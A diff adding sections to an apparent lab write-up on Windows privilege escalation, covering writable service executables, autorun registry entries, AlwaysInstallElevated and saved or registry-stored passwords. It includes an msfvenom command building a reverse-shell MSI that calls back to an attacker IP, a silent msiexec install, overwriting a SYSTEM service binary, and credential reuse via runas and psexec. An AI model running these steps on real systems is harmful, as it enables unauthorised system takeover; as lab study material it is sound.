@@ -190,10 +190,103 @@ After starting a netcat listener on kali, I can use **net start** to start the e
 
   
 ## Service Exploits - Insecure Service Executables
+
+![image](https://user-images.githubusercontent.com/83407557/183143770-6e57f9c7-8a8a-4011-8672-b8fe4ba0869c.png)
+
+checking that this service runs as system
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183144678-51794ffa-1894-4383-a85e-aaa86c95d372.png)
+
+  
+`C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"` To check if service is writeable
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183144816-34e3da95-517a-4bc4-93ff-870f52b9ce53.png)
+
+  Much like the previous example, but this time I am able to copy my malicious binary with the one that 1. runs as system 2. Is itself writeable
+  
+  `copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
+
+Starting a netcat listener first, I can then start the service with net start <servicename>:
+  ![image](https://user-images.githubusercontent.com/83407557/183145241-62404c30-5691-465f-8c31-11bb288363ec.png)
+
+  
+  
 ## Registry - AutoRuns
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183145650-9914cae5-179e-4d13-af33-43c434053eb5.png)
+
+
+  checking via regisrty
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183145440-76e716d2-ff52-4ad6-8a13-98cd233e8cfa.png)
+
+Can also use accesschk to see if it is writeable
+  
+  `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
+  
+![image](https://user-images.githubusercontent.com/83407557/183145890-572c5043-09f7-4865-b2d5-f30bbc6644a7.png)
+
+  
+Then copy my binary to that location
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183146204-ac637d53-3549-47a6-b10d-1dafded7f848.png)
+
+ To simulate a new session (could also restart the machine and wait for an admin to log in) I will start a netcat listener, then log in as an admin on a second RDP connection:
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183146793-a54231d4-0ad2-4159-b4c9-d84c01ade44c.png)
+
+  
 ## Registry - AlwaysInstallElevated
+
+If the alaysinstallelevated key is set in the registry to be enabled, it allows all users to install .msi files onto the system.
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183153598-3b520b45-d45a-4148-a466-bd94658f5292.png)
+
+Using the windows CLI to check:
+  
+  `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+  `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+![image](https://user-images.githubusercontent.com/83407557/183155968-bf9feb2e-b011-4b8c-a571-fedd6d0bc378.png)
+
+  
+
+To create my .msi file I can use msfvenom again, and then transfer it with one of the methods.
+  
+  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.77.38 LPORT=53 -f msi -o reverse.msi`
+
+  
+Then I can use msiexec to launch my malicious installer
+  `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183156177-184ed963-f192-4dec-9411-0bd95d1f7485.png)
+
+  
 ## Passwords - Registry
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183157300-8aa068d6-7742-4775-9413-677d2073f755.png)
+
+  Can then use multiple methods to login with found creds, Like with psexec.py:
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183157787-c561d2b6-2392-4131-bcfe-c134f1454bdd.png)
+
+  ![image](https://user-images.githubusercontent.com/83407557/183157801-c50ace54-25b1-4e61-9ba7-7796cd310533.png)
+
+  or CME
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183158093-9a3266df-2834-4a7b-84ae-b5b0ca561382.png)
+
+  
 ## Passwords - saved creds
+  
+  List any saved credentials:`cmdkey /list`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183158418-375b0402-44d6-4c98-8b4a-9a0df15c733d.png)
+
+  since they are saved, I can use runas to run my malicous binary as the Administrator after starting a netcat listener:
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183159045-d951119b-bc56-465e-b71f-4dd54d027176.png)
+
+  
 ## Passwords - Security Account Manager (SAM)
 ## Passwords - Passing the Hash
 ## Scheduled Tasks
